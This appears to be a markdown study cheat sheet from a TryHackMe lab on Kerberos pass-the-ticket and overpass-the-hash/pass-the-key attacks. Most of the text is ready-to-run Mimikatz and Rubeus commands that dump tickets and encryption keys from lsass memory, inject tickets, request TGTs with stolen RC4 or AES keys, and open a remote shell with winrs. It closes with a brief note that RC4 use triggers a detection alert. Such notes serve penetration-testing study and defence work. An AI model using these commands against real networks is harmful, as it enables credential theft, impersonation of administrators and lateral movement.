#mimikatz #rubeus #winrs; 
# Pass The Ticket
- Pass the ticket involves stealing the ticket and the session key and using it impersonate the user to get access to resources or services.
- TGT & ST can be used, but TGTs are preferred because we get access to any service.
### Mimikatz
```powershell
# Tickets can be extracted from lsass memory using the following command
sekurlsa::tickets /export
# On linux, it the keys are located in files. Location of these files can be found in the kerberos configuration files: `/etc/krb5.conf`.

# Inject ticket to current session:
kerberos::ptt <ticket_id>
# This purges the current tickets from memory and injects the specified tickets
```
### Rubeus
```bash
.\Rubeus.exe dump # Dumps the tickets 
# Dumps all ticket when run with elevated privilege
.\Rubeus.exe /nowrap # dumps ticket with no new lines
.\Rubeus.exe /service:krbtgt # specify service

# Using the ticket
.\Rubeus.exe ptt /ticket:<base64ticket> 
```
- Verify the ticket with `klist`:
```powershell
klist
```
- Get a shell
```powershell
# Credentails get automatically injected. similar to runas's /netonly
winrs.exe -r:<server/IP> cmd.exe
```
# Overpass The Hash/Pass The Key
- When a user requests a TGT, the TGT encrypts the timestamp and other details with a key derived from their password. 
- The algorithm used call be the following depending on the kerberos configuration :
	- DES (Deprecated)
	- RC4
	- AES128
	- AES256
- We can ask the Key Distrubution Center for TGT by passing this key through mimikatz
### Mimikatz
- Mimikatz will open a PowerShell session with a logon type 9 (whis is the same as running `runas` with `netonly` option).
- Requires elevation.
```powershell
# for dumping keys from lsass
sekurlsa::ekeys

# For RC4 Hash
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:<key> /run:"<command>"

# For AES128
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:<key> /run:"<command>"

# For AES256
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<key> /run:"<command>"
```
### Rubeus
```powershell
# pass the key: rc4
# Doesn't require elevation
.\Rubeus.exe asktgt /user:administrator /rc4:<hash/key> /ptt

# This requires elevation
.\Rubeus.exe asktgt /user:administrator /aes256:<key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH). Using RC4 will be marked as "Encryption Donwgrade" and MDI will flag an alert.